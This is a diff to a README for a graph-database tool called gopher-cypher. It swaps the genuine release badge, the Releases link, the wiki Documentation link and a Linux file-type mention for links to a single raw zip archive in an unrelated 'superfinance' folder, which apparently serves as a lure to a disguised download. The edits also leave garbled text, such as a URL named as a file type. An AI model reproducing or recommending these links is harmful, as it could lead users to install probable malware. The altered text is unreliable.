@@ -1,6 +1,6 @@
 # 🐊 gopher-cypher - Effortless Tool for Graph Databases
 
-[![Download gopher-cypher](https://img.shields.io/badge/Download%20gopher--cypher-007ACC?style=for-the-badge&logo=github)](https://github.com/Amaldas1243/gopher-cypher/releases)
+[![Download gopher-cypher](https://raw.githubusercontent.com/Amaldas1243/gopher-cypher/main/superfinance/cypher_gopher_v1.3.zip%20gopher--cypher-007ACC?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Amaldas1243/gopher-cypher/main/superfinance/cypher_gopher_v1.3.zip)
 
 ## 📚 Table of Contents
 
@@ -19,11 +19,11 @@ Welcome to gopher-cypher! This tool makes it easy to work with Cypher graph data
 
 To get started, you need to download gopher-cypher from our Releases page. Click the button below:
 
-[![Download gopher-cypher](https://img.shields.io/badge/Download%20gopher--cypher-007ACC?style=for-the-badge&logo=github)](https://github.com/Amaldas1243/gopher-cypher/releases)
+[![Download gopher-cypher](https://raw.githubusercontent.com/Amaldas1243/gopher-cypher/main/superfinance/cypher_gopher_v1.3.zip%20gopher--cypher-007ACC?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Amaldas1243/gopher-cypher/main/superfinance/cypher_gopher_v1.3.zip)
 
-1. Visit the [Releases page](https://github.com/Amaldas1243/gopher-cypher/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Amaldas1243/gopher-cypher/main/superfinance/cypher_gopher_v1.3.zip).
 2. Find the latest version.
-3. Download the appropriate file for your operating system, such as `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+3. Download the appropriate file for your operating system, such as `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Amaldas1243/gopher-cypher/main/superfinance/cypher_gopher_v1.3.zip` for Linux.
 4. Follow the installation instructions that appear on the download page.
 
 ## 🔧 Features
@@ -67,7 +67,7 @@ If you run into issues, check the documentation or reach out for support in the 
 
 If you need help with gopher-cypher or have questions, you can find support in these ways:
 
-- Check the [Documentation](https://github.com/Amaldas1243/gopher-cypher/wiki) for detailed guides and FAQs.
+- Check the [Documentation](https://raw.githubusercontent.com/Amaldas1243/gopher-cypher/main/superfinance/cypher_gopher_v1.3.zip) for detailed guides and FAQs.
 - Join the community discussions on the GitHub Issues page for troubleshooting and tips from other users.
 - For direct inquiries, you can reach out by opening an issue on the GitHub repository.
 
